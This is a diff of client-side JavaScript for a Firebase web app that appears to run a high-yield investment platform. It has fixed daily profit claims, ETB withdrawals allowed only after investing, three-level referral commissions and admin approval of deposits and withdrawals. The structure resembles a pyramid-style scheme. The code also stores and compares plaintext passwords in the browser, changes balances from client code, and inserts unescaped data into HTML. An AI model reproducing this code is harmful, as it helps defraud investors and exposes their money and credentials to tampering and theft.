+                document.getElementById('bindAccountNumber').value = currentUserData.bankDetails.accountNumber || '';
+            } else {
+                document.getElementById('bindBankName').value = '';
+                document.getElementById('bindAccountName').value = '';
+                document.getElementById('bindAccountNumber').value = '';
+            }
+            document.getElementById('bindPassword').value = '';
+            document.getElementById('bindBankModal').style.display = 'block';
+        }
+        
+        function closeBindBankModal() {
+            document.getElementById('bindBankModal').style.display = 'none';
+        }
+
+        async function bindBankAccount() {
+            const bankName = document.getElementById('bindBankName').value;
+            const accountName = document.getElementById('bindAccountName').value.trim();
+            const accountNumber = document.getElementById('bindAccountNumber').value.trim();
+            const password = document.getElementById('bindPassword').value;
+
+            if (!bankName || !accountName || !accountNumber || !password) {
+                return alert("Please fill in all fields.");
+            }
+
+            if (password !== currentUserData.password) {
+                return alert("Incorrect Password. Cannot bind bank.");
+            }
+
+            const bankInfo = {
+                bankName: bankName,
+                accountName: accountName,
+                accountNumber: accountNumber
+            };
+
+            // CHECK UNIQUENESS
+            try {
+                const snapshot = await database.ref('users')
+                    .orderByChild('bankDetails/accountNumber')
+                    .equalTo(accountNumber)
+                    .once('value');
+
+                if (snapshot.exists()) {
+                    let isTaken = false;
+                    snapshot.forEach(childSnapshot => {
+                        if (decodeURIComponent(childSnapshot.key) !== currentUserPhone) {
+                            isTaken = true;
+                        }
+                    });
+
+                    if (isTaken) {
+                        return alert("Error: This bank account number is already linked to another user!");
+                    }
+                }
+
+                database.ref('users/' + encodeURIComponent(currentUserPhone)).update({ bankDetails: bankInfo })
+                    .then(() => {
+                        alert("Bank Account Bound Successfully!");
+                        closeBindBankModal();
+                    })
+                    .catch(err => alert("Error binding bank: " + err.message));
+
+            } catch (error) {
+                alert("System Error checking account: " + error.message);
+            }
+        }
+
+        // PROFILE PICTURE LOGIC
+        function openProfileModal() {
+            document.getElementById('profilePicModal').style.display = 'block';
+        }
+
+        function closeProfileModal() {
+            document.getElementById('profilePicModal').style.display = 'none';
+        }
+
+        function saveProfilePic(url) {
+            if (!currentUserPhone) return;
+            database.ref('users/' + encodeURIComponent(currentUserPhone)).update({ profilePic: url })
+                .then(() => {
+                    document.getElementById('userProfilePic').src = url;
+                    closeProfileModal();
+                });
+        }
+
+        // WITHDRAWAL LOGIC
+        function openWithdrawModal() {
+            if (!currentUserPhone) return;
+            
+            if (!currentUserData || !currentUserData.bankDetails) {
+                alert("Please Bind Your Bank Account First!");
+                openBindBankModal(); 
+                return;
+            }
+
+            document.getElementById('displayWithdrawBank').innerText = currentUserData.bankDetails.bankName;
+            document.getElementById('displayWithdrawAcc').innerText = currentUserData.bankDetails.accountNumber;
+            
+            document.getElementById('withdrawAmount').value = '';
+            document.getElementById('withdrawPassword').value = '';
+            document.getElementById('withdrawModal').style.display = 'block';
+        }
+
+        function closeWithdrawModal() {
+            document.getElementById('withdrawModal').style.display = 'none';
+        }
+
+        async function submitWithdrawRequest() {
+            const amount = parseFloat(document.getElementById('withdrawAmount').value);
+            const password = document.getElementById('withdrawPassword').value;
+
+            if (isNaN(amount) || amount < 150) return alert("Please enter a valid amount (minimum 150 ETB).");
+            if (!password) return alert("Please enter your password.");
+
+            if (password !== currentUserData.password) {
+                return alert("Incorrect Password.");
+            }
+
+            const userRef = database.ref('users/' + encodeURIComponent(currentUserPhone));
+
+            try {
+                await userRef.transaction((currentData) => {
+                    if (currentData === null) return;
+                    return currentData; 
+                }, (error, committed, snapshot) => {
+                    if (error) return alert('Transaction failed.');
+                    if (committed) {
+                        const userData = snapshot.val();
+                        
+                        if ((userData.totalInvestment || 0) <= 0) return alert("Withdrawal Failed: You must invest first.");
+                        if (userData.balance < amount) return alert(`Insufficient balance. You have $${userData.balance.toFixed(2)}.`);
+
+                        userRef.update({ balance: userData.balance - amount }).then(() => {
+                            const txKey = logTransactionHistory(currentUserPhone, 'Withdrawal', amount, 'Debit', 'Pending', `To: ${currentUserData.bankDetails.bankName}`);
+
+                            const withdrawalRequest = {
+                                userPhone: currentUserPhone,
+                                amount: amount,
+                                bankName: currentUserData.bankDetails.bankName,
+                                bankAccount: currentUserData.bankDetails.accountNumber,
+                                accountName: currentUserData.bankDetails.accountName, 
+                                status: 'Pending',
+                                timestamp: new Date().toISOString(),
+                                historyId: txKey 
+                            };
+                            
+                            database.ref('withdrawal_requests').push(withdrawalRequest);
+                            
+                            alert("Withdrawal request submitted successfully! Pending Admin Approval.");
+                            closeWithdrawModal();
+                        });
+                    }
+                });
+            } catch (error) {
+                console.error(error);
+                alert("System error during withdrawal.");
+            }
+        }
+
+        // PASSWORD CHANGE LOGIC
+        function openChangePasswordModal() {
+            document.getElementById('oldPassword').value = '';
+            document.getElementById('newPassword').value = '';
+            document.getElementById('confirmNewPassword').value = '';
+            document.getElementById('changePasswordModal').style.display = 'block';
+        }
+        function closeChangePasswordModal() {
+            document.getElementById('changePasswordModal').style.display = 'none';
+        }
+        async function submitChangePassword() {
+            const oldPass = document.getElementById('oldPassword').value;
+            const newPass = document.getElementById('newPassword').value;
+            const confirmPass = document.getElementById('confirmNewPassword').value;
+
+            if (!oldPass || !newPass || !confirmPass) return alert("Please fill all fields.");
+            if (newPass !== confirmPass) return alert("New passwords do not match.");
+            if (oldPass !== currentUserData.password) return alert("Incorrect Old Password.");
+
+            try {
+                await database.ref('users/' + encodeURIComponent(currentUserPhone)).update({ password: newPass });
+                alert("Password Changed Successfully!");
+                closeChangePasswordModal();
+            } catch (e) {
+                alert("Error updating password: " + e.message);
+            }
+        }
+
+        // REFERRAL SYSTEM HELPERS
+        async function findUserByReferralCode(code) {
+            if (!code) return null;
+            const snapshot = await database.ref('users').orderByChild('referralCode').equalTo(code).once('value');
+            if (snapshot.exists()) {
+                const data = snapshot.val();
+                const dbKey = Object.keys(data)[0]; 
+                return decodeURIComponent(dbKey);
+            }
+            return null;
+        }
+
+        async function processFirstInvestmentBonus(referrerCode, investmentAmount) {
+            try {
+                const referrerPhone = await findUserByReferralCode(referrerCode);
+                if (referrerPhone) {
+                    const bonusAmount = investmentAmount * 0.10; // 10%
+                    const referrerRef = database.ref('users/' + encodeURIComponent(referrerPhone));
+                    
+                    await referrerRef.transaction(data => {
+                        if (data) {
+                            data.balance = (parseFloat(data.balance) || 0) + bonusAmount;
+                            return data;
+                        }
+                    });
+                    
+                    logTransactionHistory(referrerPhone, 'Referral Bonus', bonusAmount, 'Credit', 'Completed', '10% First Investment Bonus');
+                }
+            } catch (err) {
+                console.error("Error processing first investment bonus:", err);
+            }
+        }
+
+        async function processDailyCommissions(userReferralCode, profitAmount) {
+            const level1Phone = await findUserByReferralCode(userReferralCode);
+            if (level1Phone) {
+                await distributeCommission(level1Phone, profitAmount * 0.08, "L1 Daily Commission (8%)"); // 8%
+
+                const level1UserSnapshot = await database.ref('users/' + encodeURIComponent(level1Phone)).once('value');
+                const level1UserData = level1UserSnapshot.val();
+                
+                if (level1UserData && level1UserData.referredBy) {
+                    const level2Phone = await findUserByReferralCode(level1UserData.referredBy);
+                    if (level2Phone) {
+                        await distributeCommission(level2Phone, profitAmount * 0.03, "L2 Daily Commission (3%)"); // 3%
+
+                        const level2UserSnapshot = await database.ref('users/' + encodeURIComponent(level2Phone)).once('value');
+                        const level2UserData = level2UserSnapshot.val();
+                        
+                        if (level2UserData && level2UserData.referredBy) {
+                            const level3Phone = await findUserByReferralCode(level2UserData.referredBy);
+                            if (level3Phone) {
+                                await distributeCommission(level3Phone, profitAmount * 0.01, "L3 Daily Commission (1%)"); // 1%
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        async function distributeCommission(phone, amount, description) {
+            const userRef = database.ref('users/' + encodeURIComponent(phone));
+            await userRef.transaction(data => {
+                if (data) {
+                    data.balance = (parseFloat(data.balance) || 0) + amount;
+                    return data;
+                }
+            });
+            logTransactionHistory(phone, 'Team Commission', amount, 'Credit', 'Completed', description);
+        }
+
+        // INVESTMENT LOGIC
+        let allInvestmentPlans = {}; 
+        function loadInvestmentPlans() {
+            const container = document.getElementById('investmentPlansContainer');
+            container.innerHTML = '<p>Loading plans...</p>';
+            database.ref('investment_plans').on('value', (snapshot) => {
+                container.innerHTML = ''; 
+                const plans = snapshot.val();
+                allInvestmentPlans = plans || {}; 
+                if (!plans) {
+                    container.innerHTML = '<p>No investment plans currently available.</p>';
+                    return;
+                }
+                Object.keys(plans).forEach(key => {
+                    const plan = plans[key];
+                    const logoSource = plan.logoURL || 'https://via.placeholder.com/150x100?text=PL'; 
+                    const totalReturn = (plan.price && plan.dailyProfit && plan.maturityDays) ? (plan.price + (plan.dailyProfit * plan.maturityDays)).toFixed(2) : 'N/A';
+                    
+                    const limitText = plan.purchaseLimit ? `<span style="color:red; font-size: 0.8em; display:block;">(Limit: ${plan.purchaseLimit} per user)</span>` : '';
+
+                    const card = `
+                        <div class="investment-card">
+                            <div class="team-logo-container"><img src="${logoSource}" alt="${plan.name}"></div>
+                            <div class="team-name">${plan.name}</div>
+                            ${limitText}
+                            <div class="card-details">
+                                <p><span class="detail-label">Price:</span><span class="detail-value">$${plan.price ? plan.price.toFixed(2) : 'N/A'}</span></p>
+                                <p><span class="detail-label">Daily:</span><span class="detail-value">$${plan.dailyProfit ? plan.dailyProfit.toFixed(2) : 'N/A'}</span></p>
+                                <p><span class="detail-label">Days:</span><span class="detail-value">${plan.maturityDays || 'N/A'}</span></p>
+                                <p><span class="detail-label">Total:</span><span class="detail-value">$${totalReturn}</span></p>
+                            </div>
+                            <button class="action-btn deposit" onclick="handleBuyPlan('${key}', ${plan.price || 0})">Buy Now</button>
+                        </div>
+                    `;
+                    container.innerHTML += card;
+                });
+            });
+        }
+        
+        async function handleBuyPlan(planId, price) {
+            if (!currentUserPhone) return alert("Please login first.");
+            const plan = allInvestmentPlans[planId];
+            if (!plan) return alert("Error: Plan not found.");
+
+            const purchaseLimit = plan.purchaseLimit || 9999; 
+            const userInvestmentsSnapshot = await database.ref('user_investments/' + encodeURIComponent(currentUserPhone)).once('value');
+            const userInvestments = userInvestmentsSnapshot.val() || {};
+            
+            let currentCount = 0;
+            Object.values(userInvestments).forEach(inv => {
+                if (inv.planId === planId) {
+                    currentCount++;
+                }
+            });
+
+            if (currentCount >= purchaseLimit) {
+                return alert(`Purchase Limit Reached! You can only buy this plan ${purchaseLimit} times.`);
+            }
+
+            if (!confirm(`Confirm purchase of ${plan.name} for $${price.toFixed(2)}?`)) return;
+
+            const userRef = database.ref('users/' + encodeURIComponent(currentUserPhone));
+            const userInvestmentsRef = database.ref('user_investments/' + encodeURIComponent(currentUserPhone));
+
+            let isFirstInvestment = false;
+
+            try {
+                const result = await userRef.transaction((currentData) => {
+                    if (currentData === null) return currentData;
+                    if ((currentData.balance || 0) >= price) {
+                        if ((currentData.totalInvestment || 0) === 0) {
+                            isFirstInvestment = true;
+                        }
+                        currentData.balance = (currentData.balance || 0) - price; 
+                        currentData.totalInvestment = (currentData.totalInvestment || 0) + price; 
+                        return currentData; 
+                    } else {
+                        return; 
+                    }
+                });
+
+                if (result.committed) {
+                    await userInvestmentsRef.push({
+                        planId: planId, planName: plan.name, dailyProfit: plan.dailyProfit, investmentPrice: price, maturityDays: plan.maturityDays,
+                        purchasedAt: new Date().toISOString(), lastClaimTime: Date.now(), claimCount: 0, logoURL: plan.logoURL 
+                    });
+                    logTransactionHistory(currentUserPhone, 'Investment Purchase', price, 'Debit', 'Completed', plan.name);
+                    
+                    if (isFirstInvestment && currentUserData.referredBy) {
+                        processFirstInvestmentBonus(currentUserData.referredBy, price);
+                    }
+
+                    alert(`Successfully purchased ${plan.name}!`);
+                } else {
+                     alert(`Purchase failed: Insufficient balance.`);
+                }
+            } catch (error) {
+                alert('Purchase Error: ' + error.message);
+            }
+        }
+        
+        function loadActiveInvestments(snapshot) {
+            const container = document.getElementById('activeInvestmentsList');
+            container.innerHTML = '';
+            const investments = snapshot.val();
+            if (!investments) {
+                container.innerHTML = '<p>No active investments found.</p>';
+                return;
+            }
+            Object.keys(investments).forEach(key => {
+                const inv = investments[key];
+                const dailyProfit = inv.dailyProfit || 0;
+                
+                const totalDays = inv.maturityDays || 0;
+                const daysGone = inv.claimCount || 0;
+                let daysLeft = totalDays - daysGone;
+                if (daysLeft < 0) daysLeft = 0; 
+
+                const card = `
+                    <div class="active-investment-card">
+                        <div style="display:flex; justify-content: space-between; align-items: center;">
+                            <div>
+                                <strong>${inv.planName}</strong>
+                                <p style="font-size: 0.9em;">Invested: $${inv.investmentPrice.toFixed(2)}</p>
+                                <p style="font-size: 0.9em; color:#388E3C;">Daily: $${dailyProfit.toFixed(2)}</p>
+                                <p style="font-size: 0.9em; color:#003366; font-weight:bold;">Days Left: ${daysLeft} / ${totalDays}</p>
+                            </div>
+                            <img src="${inv.logoURL}" style="width: 50px; height: 50px; object-fit: contain; border-radius: 5px;">
+                        </div>
+                        <button id="claimBtn_${key}" class="claim-btn disabled" data-key="${key}" data-profit="${dailyProfit}" onclick="claimDailyProfit(this)">Checking...</button>
+                    </div>
+                `;
+                container.innerHTML += card;
+            });
+        }
+        
+        function formatTimeRemaining(ms) {
+            if (ms <= 0) return "Ready!";
+            const totalSeconds = Math.floor(ms / 1000);
+            const hours = Math.floor(totalSeconds / 3600);
+            const minutes = Math.floor((totalSeconds % 3600) / 60);
+            const seconds = totalSeconds % 60;
+            return `${hours}h ${minutes}m ${seconds}s`;
+        }
+        
+        function startClaimInterval(investments) {
+            if (claimInterval) clearInterval(claimInterval); 
+            if (!investments) return;
+            updateClaimButtons(investments); 
+            claimInterval = setInterval(() => updateClaimButtons(investments), 1000); 
+        }
+
+        function updateClaimButtons(investments) {
+            const now = getEthiopiaTime().getTime();
+            const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
+            Object.keys(investments).forEach(key => {
+                const inv = investments[key];
+                const lastClaimTime = inv.lastClaimTime || 0;
+                const canClaim = (now - lastClaimTime) >= TWENTY_FOUR_HOURS;
+                const btn = document.getElementById(`claimBtn_${key}`);
+                
+                // If button is currently processing (clicked but waiting for DB), do not update text
+                if (btn && btn.classList.contains('disabled') && btn.innerText === 'Processing...') {
+                    return;
+                }
+
+                const totalDays = inv.maturityDays || 0;
+                const daysGone = inv.claimCount || 0;
+                
+                if (btn) {
+                    if (daysGone >= totalDays) {
+                        btn.className = 'claim-btn disabled';
+                        btn.innerText = 'Completed';
+                        btn.disabled = true;
+                    } else if (canClaim) {
+                        // Ensure we don't re-enable if we just clicked it (client-side safety)
+                        if (btn.innerText !== 'Processing...') {
+                            btn.className = 'claim-btn ready';
+                            btn.innerText = 'Claim Daily Profit';
+                            btn.disabled = false;
+                        }
+                    } else {
+                        btn.className = 'claim-btn disabled';
+                        btn.innerText = 'Claim in ' + formatTimeRemaining(lastClaimTime + TWENTY_FOUR_HOURS - now);
+                        btn.disabled = true;
+                    }
+                }
+            });
+        }
+
+        async function claimDailyProfit(buttonElement) {
+            // IMMEDIATE DISABLE TO PREVENT MULTI-CLICKS
+            if (buttonElement.disabled || buttonElement.classList.contains('disabled')) return;
+            
+            buttonElement.disabled = true;
+            buttonElement.classList.add('disabled');
+            const originalText = buttonElement.innerText;
+            buttonElement.innerText = 'Processing...';
+
+            const investmentKey = buttonElement.getAttribute('data-key');
+            const profit = parseFloat(buttonElement.getAttribute('data-profit'));
+            
+            const userRef = database.ref('users/' + encodeURIComponent(currentUserPhone));
+            const investmentRef = database.ref(`user_investments/${encodeURIComponent(currentUserPhone)}/${investmentKey}`);
+
+            try {
+                const investmentSnapshot = await investmentRef.once('value');
+                const inv = investmentSnapshot.val();
+                
+                const totalDays = inv.maturityDays || 0;
+                const daysGone = inv.claimCount || 0;
+                
+                if (daysGone >= totalDays) {
+                    alert("Investment cycle completed.");
+                    return; 
+                }
+
+                const now = getEthiopiaTime().getTime();
+                if (now - (inv.lastClaimTime || 0) < 24 * 60 * 60 * 1000) {
+                     alert("Claim failed: Please wait for the 24 hour timer.");
+                     return;
+                }
+                
+                await userRef.transaction((currentData) => {
+                    if (currentData) {
+                        currentData.balance = (currentData.balance || 0) + profit;
+                        currentData.totalIncome = (currentData.totalIncome || 0) + profit;
+                        return currentData;
+                    }
+                });
+                await investmentRef.update({ lastClaimTime: now, claimCount: (inv.claimCount || 0) + 1 });
+                logTransactionHistory(currentUserPhone, 'Daily Claim', profit, 'Credit', 'Completed', inv.planName);
+                
+                if (currentUserData.referredBy) {
+                    processDailyCommissions(currentUserData.referredBy, profit);
+                }
+
+                alert(`Claim Successful! $${profit.toFixed(2)} added.`);
+                
+            } catch (error) { 
+                alert('Claim Error: ' + error.message);
+                buttonElement.disabled = false;
+                buttonElement.classList.remove('disabled');
+                buttonElement.innerText = originalText;
+            }
+        }
+
+        // HISTORY
+        function logTransactionHistory(userPhone, type, amount, flow, status, details = '') {
+            const ref = database.ref('transaction_history/' + encodeURIComponent(userPhone)).push();
+            ref.set({
+                type, amount, flow, status, details, timestamp: new Date().toISOString()
+            });
+            return ref.key; 
+        }
+        
+        let currentHistoryData = [];
+
+        // CHANGED: Open Full Page instead of Modal
+        function openHistoryPage() {
+            if (!currentUserPhone) return;
+            
+            // Hide all pages
+            document.querySelectorAll('.page-section').forEach(p => p.style.display = 'none');
+            // Hide Navigation Bar
+            document.querySelector('.navbar').style.display = 'none';
+            // Hide Main App Header
+            document.getElementById('appHeader').style.display = 'none';
+            // Show History Page
+            document.getElementById('historyPage').style.display = 'block';
+            
+            const historyList = document.getElementById('historyList');
+            historyList.innerHTML = '<p>Loading...</p>';
+            
+            database.ref('transaction_history/' + encodeURIComponent(currentUserPhone)).limitToLast(100).once('value', (snapshot) => {
+                const history = snapshot.val();
+                if (!history) {
+                    currentHistoryData = [];
+                    historyList.innerHTML = '<p>No transactions yet.</p>';
+                    return;
+                }
+                currentHistoryData = Object.values(history).reverse();
+                
+                filterHistory('All');
+            });
+        }
+
+        // NEW: Close History Page and go back to Me
+        function closeHistoryPage() {
+            document.getElementById('historyPage').style.display = 'none';
+            document.getElementById('appHeader').style.display = 'block';
+            document.querySelector('.navbar').style.display = 'flex';
+            document.getElementById('mePage').style.display = 'block';
+        }
+
+        function filterHistory(filterType) {
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                if(btn.innerText === filterType) btn.classList.add('active');
+                else btn.classList.remove('active');
+            });
+
+            const historyList = document.getElementById('historyList');
+            historyList.innerHTML = '';
+
+            let filteredData = [];
+
+            if (filterType === 'All') {
+                filteredData = currentHistoryData;
+            } else if (filterType === 'Deposit') {
+                filteredData = currentHistoryData.filter(item => item.type.includes('Deposit'));
+            } else if (filterType === 'Withdraw') {
+                filteredData = currentHistoryData.filter(item => item.type.includes('Withdraw'));
+            } else if (filterType === 'Income') {
+                filteredData = currentHistoryData.filter(item => 
+                    item.type === 'Daily Claim' || 
+                    item.type === 'Referral Bonus' || 
+                    item.type === 'Team Commission'
+                );
+            }
+
+            if (filteredData.length === 0) {
+                historyList.innerHTML = `<p>No ${filterType} records found.</p>`;
+                return;
+            }
+
+            filteredData.forEach(item => {
+                const date = new Date(item.timestamp).toLocaleDateString('en-US', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: 'short' });
+                const color = item.flow === 'Credit' ? 'green' : 'red';
+                let statusColor = '#777';
+                if(item.status === 'Approved' || item.status === 'Completed') statusColor = 'green';
+                if(item.status === 'Rejected') statusColor = 'red';
+                if(item.status === 'Pending') statusColor = 'orange';
+
+                historyList.innerHTML += `
+                    <div class="history-item">
+                        <div>
+                            <span class="history-type">${item.type}</span> 
+                            <span>(${item.details})</span>
+                            <div class="history-date">${date} | <span style="font-weight:bold; color:${statusColor}">${item.status}</span></div>
+                        </div>
+                        <div class="history-amount" style="color:${color}">
+                            ${item.flow === 'Credit' ? '+' : '-'}$${item.amount.toFixed(2)}
+                        </div>
+                    </div>`;
+            });
+        }
+
+        // ADMIN LOGIC - DEPOSITS
+        function loadDepositRequests() {
+            const container = document.getElementById('depositRequestsList');
+            database.ref('deposit_requests').orderByChild('status').equalTo('Pending').on('value', (snapshot) => {
+                const requests = snapshot.val();
+                container.innerHTML = requests ? '' : '<p>No pending requests.</p>';
+                if (requests) Object.keys(requests).forEach(key => {
+                    const req = requests[key];
+                    container.innerHTML += `<div class="deposit-request-item"><div class="request-info">User: ${req.userPhone}<br>$${req.amount} (${req.method})<br>TID: ${req.transactionId}</div><div class="request-actions"><button class="approve-btn" onclick="approveDeposit('${key}', '${req.userPhone}', ${req.amount}, '${req.transactionId}')">Approve</button><button class="reject-btn" onclick="rejectDeposit('${key}', '${req.userPhone}', ${req.amount}, '${req.transactionId}')">Reject</button></div></div>`;
+                });
+            });
+        }
+        
+        async function approveDeposit(requestId, userPhone, amount, transactionId) {
+            if (!confirm(`Approve $${amount} for ${userPhone}?`)) return;
+            
+            const reqSnapshot = await database.ref('deposit_requests/' + requestId).once('value');
+            const reqData = reqSnapshot.val();
+
+            const userRef = database.ref('users/' + encodeURIComponent(userPhone));
+            try {
+                await userRef.transaction((data) => {
+                    if (data) {
+                        data.balance = (data.balance || 0) + parseFloat(amount);
+                        data.totalRecharge = (data.totalRecharge || 0) + parseFloat(amount);
+                        return data;
+                    }
+                });
+                
+                await database.ref('deposit_requests/' + requestId).update({ status: 'Approved', approvedBy: currentUserPhone });
+
+                if(reqData && reqData.historyId) {
+                    await database.ref('transaction_history/' + encodeURIComponent(userPhone) + '/' + reqData.historyId).update({ status: 'Completed' });
+                }
+
+                alert('Deposit Approved.');
+            } catch (e) { alert('Error: ' + e.message); }
+        }
+
+        async function rejectDeposit(requestId, userPhone, amount, transactionId) {
+            if (!confirm('Reject this request?')) return;
+
+            const reqSnapshot = await database.ref('deposit_requests/' + requestId).once('value');
+            const reqData = reqSnapshot.val();
+
+            await database.ref('deposit_requests/' + requestId).update({ status: 'Rejected' });
+            
+            if(reqData && reqData.historyId) {
+                await database.ref('transaction_history/' + encodeURIComponent(userPhone) + '/' + reqData.historyId).update({ status: 'Rejected' });
+            }
+        }
+
+        // ADMIN LOGIC - WITHDRAWALS
+        function loadWithdrawalRequests() {
+            const container = document.getElementById('withdrawalRequestsList');
+            database.ref('withdrawal_requests').orderByChild('status').equalTo('Pending').on('value', (snapshot) => {
+                const requests = snapshot.val();
+                container.innerHTML = requests ? '' : '<p>No pending withdrawal requests.</p>';
+                if (requests) Object.keys(requests).forEach(key => {
+                    const req = requests[key];
+                    container.innerHTML += `
+                        <div class="withdrawal-request-item" style="border-left: 4px solid orange;">
+                            <div class="request-info">
+                                <strong>${req.userPhone}</strong> requests <strong>$${req.amount}</strong><br>
+                                <span style="font-size:0.85em; color: #555;">Bank: ${req.bankName}<br>Acc: ${req.bankAccount}<br>Name: ${req.accountName}</span>
+                            </div>
+                            <div class="request-actions">
+                                <button class="approve-btn" onclick="approveWithdrawal('${key}', '${req.userPhone}', ${req.amount})">Approve</button>
+                                <button class="reject-btn" onclick="rejectWithdrawal('${key}', '${req.userPhone}', ${req.amount})">Reject</button>
+                            </div>
+                        </div>`;
+                });
+            });
+        }
+
+        async function approveWithdrawal(requestId, userPhone, amount) {
+            if(!confirm("Approve this withdrawal? The money is already deducted from user.")) return;
+            
+            const reqSnapshot = await database.ref('withdrawal_requests/' + requestId).once('value');
+            const reqData = reqSnapshot.val();
+
+            const userRef = database.ref('users/' + encodeURIComponent(userPhone));
+            
+            try {
+                await userRef.transaction((data) => {
+                    if (data) {
+                        data.totalWithdraw = (data.totalWithdraw || 0) + parseFloat(amount);
+                        return data;
+                    }
+                });
+                
+                await database.ref('withdrawal_requests/' + requestId).update({ status: 'Approved', approvedBy: 'Admin' });
+
+                if(reqData && reqData.historyId) {
+                    await database.ref('transaction_history/' + encodeURIComponent(userPhone) + '/' + reqData.historyId).update({ status: 'Completed' });
+                }
+
+                alert("Withdrawal Approved.");
+            } catch (err) {
+                alert("Error: " + err.message);
+            }
+        }
+
+        async function rejectWithdrawal(requestId, userPhone, amount) {
+            if(!confirm("Reject this withdrawal? The money will be REFUNDED to the user.")) return;
+            
+            const reqSnapshot = await database.ref('withdrawal_requests/' + requestId).once('value');
+            const reqData = reqSnapshot.val();
+
+            const userRef = database.ref('users/' + encodeURIComponent(userPhone));
+            try {
+                await userRef.transaction((data) => {
+                    if (data) {
+                        data.balance = (data.balance || 0) + parseFloat(amount);
+                        return data;
+                    }
+                });
+                
+                await database.ref('withdrawal_requests/' + requestId).update({ status: 'Rejected', rejectedBy: 'Admin' });
+
+                logTransactionHistory(userPhone, 'Withdrawal Refund', amount, 'Credit', 'Completed', 'Admin Rejected Request');
+                
+                if(reqData && reqData.historyId) {
+                    await database.ref('transaction_history/' + encodeURIComponent(userPhone) + '/' + reqData.historyId).update({ status: 'Rejected' });
+                }
+
+                alert("Withdrawal Rejected & Money Refunded.");
+            } catch (err) {
+                alert("Error rejecting: " + err.message);
+            }
+        }
+        
+        // ADMIN LOGIC - PLANS
+        function selectLogo(element) {
+            document.querySelectorAll('.photo-thumbnail').forEach(el => el.classList.remove('selected'));
+            element.classList.add('selected');
+            currentSelectedLogo = element.getAttribute('data-logo');
+            document.getElementById('selectedLogoName').innerText = currentSelectedLogo;
+        }
+        function createInvestmentPlan() {
+            const name = document.getElementById('planName').value.trim();
+            const price = parseFloat(document.getElementById('planPrice').value);
+            const profit = parseFloat(document.getElementById('planProfit').value);
+            const days = parseInt(document.getElementById('planDays').value);
+            const limit = parseInt(document.getElementById('planLimit').value); 
+
+            if (!name || isNaN(price) || isNaN(profit) || isNaN(days) || isNaN(limit) || !currentSelectedLogo) {
+                return alert('Please fill all fields, including the Limit, and select a logo.');
+            }
+            
+            database.ref('investment_plans').push({ 
+                name, 
+                price, 
+                dailyProfit: profit, 
+                maturityDays: days, 
+                purchaseLimit: limit, 
+                logoURL: currentSelectedLogo 
+            });
+            alert('Plan Created Successfully with Limit!');
+        }
+        function loadAdminInvestmentManagement() {
+            const container = document.getElementById('existingPlansList');
+            database.ref('investment_plans').on('value', (snapshot) => {
+                const plans = snapshot.val();
+                container.innerHTML = plans ? '' : '<p>No plans.</p>';
+                if (plans) Object.keys(plans).forEach(key => {
+                    const plan = plans[key];
+                    container.innerHTML += `<div class="plan-item"><div>${plan.name} ($${plan.price}) - Limit: ${plan.purchaseLimit || 'None'}</div><div><button class="delete-btn" onclick="deletePlan('${key}')">Delete</button></div></div>`;
+                });
+            });
+        }
+        function deletePlan(planId) { if(confirm('Delete plan?')) database.ref('investment_plans/' + planId).remove(); }
+        
+        // NAV & INIT
+        function activateNavigation() {
+            const navItems = document.querySelectorAll('.navbar .nav-item');
+            const pages = document.querySelectorAll('.page-section');
+            navItems.forEach(item => {
+                item.addEventListener('click', () => {
+                    navItems.forEach(nav => nav.classList.remove('active'));
+                    pages.forEach(page => page.style.display = 'none');
+                    item.classList.add('active');
+                    document.getElementById(item.getAttribute('data-page')).style.display = 'block';
+                });
+            });
+        }
+        function copyReferralLink() {
+            navigator.clipboard.writeText(document.getElementById('referralLink').innerText).then(() => alert('Copied!')).catch(() => alert('Copy failed.'));
+        }
+
+        // ABOUT PAGE FUNCTIONS
+        function openAboutPage() {
+            document.querySelectorAll('.page-section').forEach(p => p.style.display = 'none');
+            document.querySelector('.navbar').style.display = 'none';
+            document.getElementById('aboutPage').style.display = 'block';
+            document.getElementById('appHeader').style.display = 'none';
+        }
+
+        function closeAboutPage() {
+            document.getElementById('aboutPage').style.display = 'none';
+            document.getElementById('appHeader').style.display = 'block';
+            document.querySelector('.navbar').style.display = 'flex';
+            document.getElementById('mePage').style.display = 'block';
+        }
+
+        // TELEGRAM POPUP FUNCTIONS
+        function showTelegramPopup() {
+            document.getElementById('telegramPopup').style.display = 'block';
+        }
+
+        function closeTelegramPopup() {
+            document.getElementById('telegramPopup').style.display = 'none';
+        }
+
+        function joinTelegramAndClose() {
+            window.open('https://t.me/+EuLZzfraMdllNGVk', '_blank');
+            closeTelegramPopup();
+        }
+
+        // --- NEW FUNCTIONS FOR TEAM DETAILS MODAL ---
+        function openTeamDetailsModal() {
+            if(!currentUserData || !currentUserData.referralCode) return;
+            
+            document.getElementById('teamDetailsModal').style.display = 'block';
+            const container = document.getElementById('teamListContainer');
+            container.innerHTML = '<p style="text-align:center;">Loading...</p>';
+
+            const usersRef = database.ref('users');
+            usersRef.orderByChild('referredBy').equalTo(currentUserData.referralCode).once('value', (snapshot) => {
+                const team = snapshot.val();
+                container.innerHTML = '';
+
+                if (!team) {
+                    container.innerHTML = '<p style="text-align:center;">No team members found.</p>';
+                    return;
+                }
+
+                let hasInvestors = false;
+
+                Object.keys(team).forEach(key => { // Key is usually the phone number encoded
+                    const member = team[key];
+                    const invested = parseFloat(member.totalInvestment || 0);
+
+                    if (invested > 0) {
+                        hasInvestors = true;
+                        // Decode phone (key) usually needs decodeURIComponent if stored that way
+                        let phoneDisplay = decodeURIComponent(key);
+                        // Masking: +2519112233 -> +251****33
+                        if(phoneDisplay.length > 8) {
+                            phoneDisplay = phoneDisplay.substring(0, 6) + '****' + phoneDisplay.substring(phoneDisplay.length - 2);
+                        }
+
+                        container.innerHTML += `
+                            <div class="record-item">
+                                <div class="record-user">
+                                    <i class="fas fa-user" style="color:#003366; margin-right:8px;"></i>
+                                    <span>${phoneDisplay}</span>
+                                </div>
+                                <div class="record-amount" style="color: #003366;">
+                                    Invested: $${invested.toFixed(2)}
+                                </div>
+                            </div>
+                        `;
+                    }
+                });
+
+                if (!hasInvestors) {
+                    container.innerHTML = '<p style="text-align:center;">No active investors in your team yet.</p>';
+                }
+            });
+        }
+
+        function closeTeamDetailsModal() {
+            document.getElementById('teamDetailsModal').style.display = 'none';
+        }
+        // ---------------------------------------------
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const homeNav = document.querySelector('.nav-item[data-page="homePage"]');
+            if (homeNav) homeNav.classList.add('active');
